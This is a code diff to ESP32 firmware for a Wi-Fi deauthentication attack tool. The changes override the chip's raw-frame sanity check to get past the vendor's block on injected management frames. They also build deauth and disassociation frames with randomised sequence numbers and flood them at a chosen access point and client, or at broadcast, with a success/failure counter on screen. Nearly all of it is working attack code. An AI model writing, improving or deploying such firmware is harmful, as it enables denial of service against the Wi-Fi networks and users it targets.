@@ -4,56 +4,79 @@
 
 extern InputHandling inputHandler;
 
+// Override ESP32 ROM sanity check — our .o is linked before libnet80211.a so this wins.
+// Returns 1 when arg==31337 (raw injection call) to allow the frame through.
+extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
+    if (arg == 31337) return 1;
+    return 0;
+}
+
 static const uint8_t BROADCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
-// ── task params ───────────────────────────────────────────────────────────────
 struct DeauthParams {
     uint8_t           bssid[6];
     uint8_t           client[6];
     bool              directed;
     volatile uint32_t framesSent;
+    volatile uint32_t framesFailed;
 };
 
-// ── helpers (static free functions so the task can call them) ─────────────────
-static void buildDeauthFrame(uint8_t* f, const uint8_t* da, const uint8_t* sa, const uint8_t* bssid) {
-    f[0]=0xC0; f[1]=0x00; f[2]=0x00; f[3]=0x00;
+// Builds a deauth (0xC0) or disassoc (0xA0) frame with randomised sequence number
+static void buildFrame(uint8_t* f, const uint8_t* da, const uint8_t* sa,
+                       const uint8_t* bssid, bool is_disassoc) {
+    f[0] = is_disassoc ? 0xA0 : 0xC0;
+    f[1] = 0x00;
+    f[2] = 0x3a; f[3] = 0x01;          // duration 314 µs
     memcpy(f+4,  da,    6);
     memcpy(f+10, sa,    6);
     memcpy(f+16, bssid, 6);
-    f[22]=0x00; f[23]=0x00;
-    f[24]=0x07; f[25]=0x00;
+    uint16_t seq = random(0, 4096);
+    f[22] = (seq >> 4) & 0xFF;
+    f[23] = (seq & 0x0F) << 4;
+    f[24] = 0x07; f[25] = 0x00;        // reason 7: class-3 from non-assoc STA
 }
 
-// ── Core 0 task: only sends frames, no display, no blocking ───────────────────
+// Send one frame three times with 1 ms gaps (mirrors Bruce's send_raw_frame)
+static inline void sendFrame3x(const uint8_t* f, volatile uint32_t& ok, volatile uint32_t& fail) {
+    for (int i = 0; i < 3; i++) {
+        esp_err_t e = esp_wifi_80211_tx(WIFI_IF_AP, f, 26, false);
+        if (e == ESP_OK) ok++; else fail++;
+        vTaskDelay(pdMS_TO_TICKS(1));
+    }
+}
+
 static void deauthTaskFn(void* p) {
     DeauthParams* params = (DeauthParams*)p;
     uint8_t frame[26];
 
     while (!TaskManager::stopRequested) {
-        for (int i = 0; i < 100 && !TaskManager::stopRequested; i++) {
-            if (params->directed) {
-                buildDeauthFrame(frame, params->client, params->bssid, params->bssid);
-                esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
-                buildDeauthFrame(frame, params->bssid, params->client, params->bssid);
-                esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
-                params->framesSent += 2;
-            } else {
-                buildDeauthFrame(frame, BROADCAST, params->bssid, params->bssid);
-                esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
-                params->framesSent++;
-            }
-            vTaskDelay(pdMS_TO_TICKS(1));
+        if (params->directed) {
+            // AP → client
+            buildFrame(frame, params->client, params->bssid, params->bssid, false);
+            sendFrame3x(frame, params->framesSent, params->framesFailed);
+            buildFrame(frame, params->client, params->bssid, params->bssid, true);
+            sendFrame3x(frame, params->framesSent, params->framesFailed);
+            // client → AP
+            buildFrame(frame, params->bssid, params->client, params->bssid, false);
+            sendFrame3x(frame, params->framesSent, params->framesFailed);
+            buildFrame(frame, params->bssid, params->client, params->bssid, true);
+            sendFrame3x(frame, params->framesSent, params->framesFailed);
+        } else {
+            // AP → broadcast (deauth + disassoc)
+            buildFrame(frame, BROADCAST, params->bssid, params->bssid, false);
+            sendFrame3x(frame, params->framesSent, params->framesFailed);
+            buildFrame(frame, BROADCAST, params->bssid, params->bssid, true);
+            sendFrame3x(frame, params->framesSent, params->framesFailed);
         }
+        vTaskDelay(pdMS_TO_TICKS(2));
     }
     TaskManager::taskRunning = false;
     vTaskDelete(nullptr);
 }
 
-// ── constructor ───────────────────────────────────────────────────────────────
 DeauthAttack::DeauthAttack(DisplayManager& displayManager, WiFiFunctions& wifiFunctions)
     : displayManager(displayManager), wifiFunctions(wifiFunctions) {}
 
-// ── helpers ───────────────────────────────────────────────────────────────────
 bool DeauthAttack::parseMac(const char* str, uint8_t* mac) {
     if (!str || strlen(str) < 17) return false;
     return sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
@@ -67,7 +90,6 @@ String DeauthAttack::macStr(const uint8_t* m) {
     return String(buf);
 }
 
-// ── argument parser ───────────────────────────────────────────────────────────
 void DeauthAttack::start(char* args) {
     if (!args || !*args) {
         displayManager.setCursor(10, displayManager.getCursorY());
@@ -92,7 +114,6 @@ void DeauthAttack::start(char* args) {
     int     channel = 6;
 
     if (strchr(first, ':') == nullptr) {
-        // index mode
         int idx = atoi(first);
         if (!wifiFunctions.isScanDone()) {
             displayManager.setCursor(10, displayManager.getCursorY());
@@ -117,7 +138,6 @@ void DeauthAttack::start(char* args) {
         displayManager.printText("Channel: "); displayManager.println(channel);
         delay(800);
     } else {
-        // BSSID mode
         if (!parseMac(first, bssid)) {
             displayManager.setCursor(10, displayManager.getCursorY());
             displayManager.println("Invalid BSSID. Format: XX:XX:XX:XX:XX:XX");
@@ -134,14 +154,16 @@ void DeauthAttack::start(char* args) {
     sendDeauthFrames(bssid, directed ? clientMac : BROADCAST, channel, directed);
 }
 
-// ── attack: Core 0 sends frames, Core 1 handles UI + keyboard ─────────────────
 void DeauthAttack::sendDeauthFrames(const uint8_t* bssid, const uint8_t* client,
                                      int channel, bool directed) {
-    WiFi.disconnect(true);
-    WiFi.mode(WIFI_STA);
+    WiFi.mode(WIFI_MODE_APSTA);
+    WiFi.softAP("x", nullptr, channel, 1, 0, false);
+    delay(100);
+    esp_wifi_set_promiscuous(true);
+    delay(50);
     esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
+    delay(50);
 
-    // ── static header (drawn once) ────────────────────────────────────────────
     displayManager.clearScreen();
     displayManager.setCursor(10, outputY);
     displayManager.setTextColor(TFT_RED);
@@ -171,12 +193,12 @@ void DeauthAttack::sendDeauthFrames(const uint8_t* bssid, const uint8_t* client,
     displayManager.setTextColor(TFT_WHITE);
     int32_t counterY = displayManager.getCursorY();
 
-    // ── launch task on Core 0 ─────────────────────────────────────────────────
     DeauthParams params;
     memcpy(params.bssid,  bssid,  6);
     memcpy(params.client, client, 6);
-    params.directed    = directed;
-    params.framesSent  = 0;
+    params.directed     = directed;
+    params.framesSent   = 0;
+    params.framesFailed = 0;
 
     if (!TaskManager::start(deauthTaskFn, "deauth", &params, TASK_STACK_SMALL, 0)) {
         displayManager.println("Task start failed.");
@@ -184,7 +206,6 @@ void DeauthAttack::sendDeauthFrames(const uint8_t* bssid, const uint8_t* client,
         return;
     }
 
-    // ── Core 1 UI loop: keyboard + live counter ───────────────────────────────
     unsigned long lastUpd = 0;
     while (TaskManager::isRunning()) {
         char k = inputHandler.getKeyboardInput();
@@ -192,19 +213,28 @@ void DeauthAttack::sendDeauthFrames(const uint8_t* bssid, const uint8_t* client,
 
         unsigned long now = millis();
         if (now - lastUpd > 200) {
-            displayManager.fillRect(10, counterY, 220, LINE_HEIGHT + 2, TFT_BLACK);
+            displayManager.fillRect(10, counterY, 300, LINE_HEIGHT * 2 + 4, TFT_BLACK);
             displayManager.setCursor(10, counterY);
-            displayManager.printText("Frames: ");
+            displayManager.setTextColor(TFT_GREEN);
+            displayManager.printText("OK: ");
             displayManager.setTextColor(TFT_YELLOW);
-            displayManager.println((int)params.framesSent);
+            displayManager.printText((int)params.framesSent);
+            displayManager.setTextColor(TFT_WHITE);
+            displayManager.printText("  ");
+            displayManager.setTextColor(TFT_RED);
+            displayManager.printText("FAIL: ");
+            displayManager.setTextColor(TFT_YELLOW);
+            displayManager.println((int)params.framesFailed);
             displayManager.setTextColor(TFT_WHITE);
             lastUpd = now;
         }
         delay(10);
     }
     TaskManager::cleanup();
+    esp_wifi_set_promiscuous(false);
+    WiFi.softAPdisconnect(true);
+    WiFi.mode(WIFI_OFF);
 
-    // ── summary ───────────────────────────────────────────────────────────────
     displayManager.clearScreen();
     displayManager.setCursor(10, outputY);
     displayManager.setTextColor(TFT_YELLOW);
